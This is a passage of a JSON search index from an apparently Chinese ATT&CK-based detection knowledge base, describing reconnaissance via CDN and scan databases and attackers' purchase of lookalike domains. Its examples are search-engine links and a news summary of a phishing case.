\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22CDN\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u627e\u5de5\u5177\u6765\u6536\u96c6\u6709\u5173CDN\u4e2d\u5185\u5bb9\u670d\u52a1\u5668\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5bfb\u6c42\u548c\u9488\u5bf9CDN\u9519\u8bef\u914d\u7f6e\uff0c\u8fd9\u4e9b\u914d\u7f6e\u53ef\u80fd\u6cc4\u6f0f\u4e0d\u5e0c\u671b\u6258\u7ba1\u7684\u654f\u611f\u4fe1\u606f\u6216\u4e0d\u5177\u6709\u4e0e\u7ec4\u7ec7\u7f51\u7ad9\u4e0a\u6258\u7ba1\u7684\u5185\u5bb9\u76f8\u540c\u7684\u4fdd\u62a4\u673a\u5236\uff08\u4f8b\u5982\u767b\u5f55\u95e8\u6237\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u635f\u5bb3\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u59a5\u534f\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6316\u6d1e\u7ecf\u9a8c|\u4ece\u8d1f\u8f7d\u5747\u8861\u6216CDN\u5e94\u7528\u4e2d\u53d1\u73b0\u7684\u914d\u7f6e\u7c7b\u6f0f\u6d1e https://www.freebuf.com/vuls/227805.html \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1596-004 https://attack.mitre.org/techniques/T1596/004/ \u6316\u6d1e\u7ecf\u9a8c|\u4ece\u8d1f\u8f7d\u5747\u8861\u6216CDN\u5e94\u7528\u4e2d\u53d1\u73b0\u7684\u914d\u7f6e\u7c7b\u6f0f\u6d1e https://www.freebuf.com/vuls/227805.html","title":"T1596-004-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-CDN"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#t1596-004-cdn","text":"","title":"T1596-004-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-CDN"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u6709\u5173\u76ee\u6807\u53d7\u5bb3\u8005\u7684\u5185\u5bb9\u4f20\u9012\u7f51\u7edc\uff08CDN\uff09\u6570\u636e\u3002CDN\u5141\u8bb8\u7ec4\u7ec7\u6258\u7ba1\u6765\u81ea\u5206\u5e03\u5f0f\uff0c\u8d1f\u8f7d\u5747\u8861\u7684\u670d\u52a1\u5668\u9635\u5217\u7684\u5185\u5bb9\u3002CDN\u8fd8\u53ef\u4ee5\u5141\u8bb8\u7ec4\u7ec7\u6839\u636e\u8bf7\u6c42\u8005\u7684\u5730\u7406\u533a\u57df\u81ea\u5b9a\u4e49\u5185\u5bb9\u4f20\u9012\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22CDN\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u627e\u5de5\u5177\u6765\u6536\u96c6\u6709\u5173CDN\u4e2d\u5185\u5bb9\u670d\u52a1\u5668\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5bfb\u6c42\u548c\u9488\u5bf9CDN\u9519\u8bef\u914d\u7f6e\uff0c\u8fd9\u4e9b\u914d\u7f6e\u53ef\u80fd\u6cc4\u6f0f\u4e0d\u5e0c\u671b\u6258\u7ba1\u7684\u654f\u611f\u4fe1\u606f\u6216\u4e0d\u5177\u6709\u4e0e\u7ec4\u7ec7\u7f51\u7ad9\u4e0a\u6258\u7ba1\u7684\u5185\u5bb9\u76f8\u540c\u7684\u4fdd\u62a4\u673a\u5236\uff08\u4f8b\u5982\u767b\u5f55\u95e8\u6237\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u635f\u5bb3\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u59a5\u534f\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_1","text":"\u6316\u6d1e\u7ecf\u9a8c|\u4ece\u8d1f\u8f7d\u5747\u8861\u6216CDN\u5e94\u7528\u4e2d\u53d1\u73b0\u7684\u914d\u7f6e\u7c7b\u6f0f\u6d1e https://www.freebuf.com/vuls/227805.html","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_7","text":"MITRE-ATT&CK-T1596-004 https://attack.mitre.org/techniques/T1596/004/ \u6316\u6d1e\u7ecf\u9a8c|\u4ece\u8d1f\u8f7d\u5747\u8861\u6216CDN\u5e94\u7528\u4e2d\u53d1\u73b0\u7684\u914d\u7f6e\u7c7b\u6f0f\u6d1e https://www.freebuf.com/vuls/227805.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/","text":"T1596-005-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u626b\u63cf\u6570\u636e\u5e93 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u516c\u5171\u626b\u63cf\u6570\u636e\u5e93\u4e2d\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u4ee5\u4fbf\u5728\u5b9a\u4f4d\u65f6\u4f7f\u7528\u3002\u5404\u79cd\u5728\u7ebf\u670d\u52a1\u4e0d\u65ad\u516c\u5e03\u4e92\u8054\u7f51\u626b\u63cf/\u8c03\u67e5\u7684\u7ed3\u679c\uff0c\u901a\u5e38\u4f1a\u6536\u96c6\u8bf8\u5982\u6d3b\u8dc3\u7684IP\u5730\u5740\u3001\u4e3b\u673a\u540d\u3001\u5f00\u653e\u7684\u7aef\u53e3\u3001\u8bc1\u4e66\uff0c\u751a\u81f3\u662f\u670d\u52a1\u5668\u7684\u6807\u8bed\u7b49\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u626b\u63cf\u6570\u636e\u5e93\uff0c\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u8005\u53ef\u4ee5\u5229\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u8be2\u5de5\u5177\uff0c\u4ece\u8fd9\u4e9b\u670d\u52a1\u4e2d\u83b7\u53d6\u4fe1\u606f\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f1a\u5bfb\u6c42\u6709\u5173\u4ed6\u4eec\u5df2\u7ecf\u786e\u5b9a\u7684\u76ee\u6807\u7684\u4fe1\u606f\uff0c\u6216\u8005\u4f7f\u7528\u8fd9\u4e9b\u6570\u636e\u96c6\u6765\u53d1\u73b0\u6210\u529f\u5165\u4fb5\u7684\u673a\u4f1a\u3002\u6765\u81ea\u8fd9\u4e9b\u8d44\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u63ed\u793a\u4e86\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\u3001\u5efa\u7acb\u884c\u52a8\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u548c/\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\uff09\u7684\u673a\u4f1a\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f8b\u5982\u5229\u7528fofa\u3001zoomeye\u3001quake\u3001shodan\u7b49\u7a7a\u95f4\u6d4b\u7ed8\u7cfb\u7edf\uff0c\u6536\u96c6\u76f8\u5173\u7528\u6237\u4fe1\u606f\u3002 FOFA: https://fofa.so/ zoomeye: https://www.zoomeye.org/ quake: https://quake.360.cn/quake/#/index shodan: https://www.shodan.io/ \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1596-005 https://attack.mitre.org/techniques/T1596/005/","title":"T1596-005-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u626b\u63cf\u6570\u636e\u5e93"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#t1596-005-","text":"","title":"T1596-005-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u626b\u63cf\u6570\u636e\u5e93"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u516c\u5171\u626b\u63cf\u6570\u636e\u5e93\u4e2d\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u4ee5\u4fbf\u5728\u5b9a\u4f4d\u65f6\u4f7f\u7528\u3002\u5404\u79cd\u5728\u7ebf\u670d\u52a1\u4e0d\u65ad\u516c\u5e03\u4e92\u8054\u7f51\u626b\u63cf/\u8c03\u67e5\u7684\u7ed3\u679c\uff0c\u901a\u5e38\u4f1a\u6536\u96c6\u8bf8\u5982\u6d3b\u8dc3\u7684IP\u5730\u5740\u3001\u4e3b\u673a\u540d\u3001\u5f00\u653e\u7684\u7aef\u53e3\u3001\u8bc1\u4e66\uff0c\u751a\u81f3\u662f\u670d\u52a1\u5668\u7684\u6807\u8bed\u7b49\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u626b\u63cf\u6570\u636e\u5e93\uff0c\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u8005\u53ef\u4ee5\u5229\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u8be2\u5de5\u5177\uff0c\u4ece\u8fd9\u4e9b\u670d\u52a1\u4e2d\u83b7\u53d6\u4fe1\u606f\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f1a\u5bfb\u6c42\u6709\u5173\u4ed6\u4eec\u5df2\u7ecf\u786e\u5b9a\u7684\u76ee\u6807\u7684\u4fe1\u606f\uff0c\u6216\u8005\u4f7f\u7528\u8fd9\u4e9b\u6570\u636e\u96c6\u6765\u53d1\u73b0\u6210\u529f\u5165\u4fb5\u7684\u673a\u4f1a\u3002\u6765\u81ea\u8fd9\u4e9b\u8d44\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u63ed\u793a\u4e86\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\u3001\u5efa\u7acb\u884c\u52a8\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u548c/\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\uff09\u7684\u673a\u4f1a\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_1","text":"\u4f8b\u5982\u5229\u7528fofa\u3001zoomeye\u3001quake\u3001shodan\u7b49\u7a7a\u95f4\u6d4b\u7ed8\u7cfb\u7edf\uff0c\u6536\u96c6\u76f8\u5173\u7528\u6237\u4fe1\u606f\u3002 FOFA: https://fofa.so/ zoomeye: https://www.zoomeye.org/ quake: https://quake.360.cn/quake/#/index shodan: https://www.shodan.io/","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_7","text":"MITRE-ATT&CK-T1596-005 https://attack.mitre.org/techniques/T1596/005/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/","text":"T1583-001-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u57df\u540d \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u53ef\u5728\u5bf9\u76ee\u6807\u8fdb\u884c\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u57df\u540d\u3002\u57df\u540d\u662f\u7528\u4e8e\u4ee3\u8868\u4e00\u4e2a\u6216\u591a\u4e2aIP\u5730\u5740\u7684\u53ef\u8bfb\u540d\u79f0\u3002\u5b83\u4eec\u53ef\u4ee5\u88ab\u8d2d\u4e70\uff0c\u6216\u8005\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u514d\u8d39\u83b7\u5f97\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8d2d\u4e70\u7684\u57df\u540d\u7528\u4e8e\u5404\u79cd\u76ee\u7684\uff0c\u5305\u62ec\u7f51\u7edc\u9493\u9c7c\u3001\u975e\u6cd5\u5165\u4fb5\u4ee5\u53ca\u547d\u4ee4\u548c\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0e\u5408\u6cd5\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u5305\u62ec\u901a\u8fc7\u4f7f\u7528\u540c\u97f3\u5b57\u6216\u4f7f\u7528\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\uff08TLD\uff09\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u56fd\u9645\u5316\u57df\u540d\uff08IDN\uff09\u6765\u521b\u5efa\u89c6\u89c9\u4e0a\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u4ee5\u4fbf\u5728\u884c\u52a8\u4e2d\u4f7f\u7528\u3002 \u57df\u540d\u6ce8\u518c\u5546\u90fd\u6709\u4e00\u4e2a\u53ef\u516c\u5f00\u67e5\u770b\u7684\u6570\u636e\u5e93\uff0c\u663e\u793a\u6bcf\u4e2a\u6ce8\u518c\u57df\u540d\u7684\u8054\u7cfb\u4fe1\u606f\u3002WHOIS\u670d\u52a1\u663e\u793a\u79c1\u4eba\u5176\u4ed6\u4fe1\u606f\uff0c\u5982\u4ed6\u4eec\u81ea\u5df1\u7684\u516c\u53f8\u6570\u636e\uff0c\u800c\u4e0d\u662f\u57df\u540d\u7684\u6240\u6709\u8005\u3002\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528\u8fd9\u79cd\u79c1\u4ebaWHOIS\u670d\u52a1\u6765\u63a9\u76d6\u5173\u4e8e\u8c01\u62e5\u6709\u6240\u8d2d\u57df\u540d\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u4f7f\u7528\u4e0d\u540c\u7684\u6ce8\u518c\u4fe1\u606f\u3001\u5728\u4e0d\u540c\u7684\u57df\u540d\u6ce8\u518c\u5546\u5904\u8d2d\u4e70\u57df\u540d\uff0c\u8fdb\u4e00\u6b65\u5e72\u6270\u8ffd\u8e2a\u5176\u57fa\u7840\u8bbe\u65bd\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65b0\u95fb\u7b80\u4ecb\uff1a\u4e0d\u6cd5\u5206\u5b50\u642d\u5efa\u4e86\u67d0\u77e5\u540d\u5916\u5356\u5e73\u53f0\u7684\u9493\u9c7c\u7f51\u7ad9\uff08www.meituam.cn\uff09\uff0c\u901a\u8fc7\u53d1\u9001\u77ed\u4fe1\u8bc8\u9a97\u8be5\u5e73\u53f0\u5165\u9a7b\u5546\u6237\u8fdb\u884c\u4e2a\u4eba\u4fe1\u606f\u5f55\u5165\u53ca\u7f34\u8d39\u3002\u8be5\u56e2\u4f19\u81ea2020\u5e74\u4ee5\u6765\uff0c\u4ee5\u6728\u9a6c\u77ed\u4fe1\u94fe\u63a5\u7684\u65b9\u5f0f\u4f5c\u684850\u4f59\u8d77\uff0c\u6d89\u6848\u8d44\u91d180\u4f59\u4e07\u5143\uff0c\u53d1\u6848\u5730\u6d89\u53ca\u5168\u56fd21\u4e2a\u7701\u4efd\u3002 https://www.sohu.com/a/452671903_648183 \u540c\u6837\u5728\u67d0\u4e9b\u7535\u5546\u5e73\u53f0\uff0c\u90e8\u5206\u53f7\u79f0\u80fd\u591f\u7834\u89e3apple\u5bc6\u7801\u7684\u5546\u5bb6\uff0c\u6240\u8c13\u7684\u8f6f\u89e3\u5bc6\uff0c\u4e5f\u662f\u7528\u7684\u76f8\u540c\u624b\u6cd5\uff0c\u4f2a\u9020\u548capple\u76f8\u4f3c\u57df\u540d\uff0c\u53d1\u9001\u9493\u9c7c\u94fe\u63a5\u7ed9\u6307\u5b9a\u7684\u7528\u6237\uff0c\u8bf1\u4f7f\u7528\u6237\u70b9\u51fb\u8fdb\u5165\u4f2a\u9020\u7ad9\u70b9\uff0c\u8f93\u5165\u8d26\u6237\u53ca\u5bc6\u7801\u3002\u4ece\u800c\u5b9e\u73b0\u8f6f\u89e3\u5bc6\u7684\u6548\u679c\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd 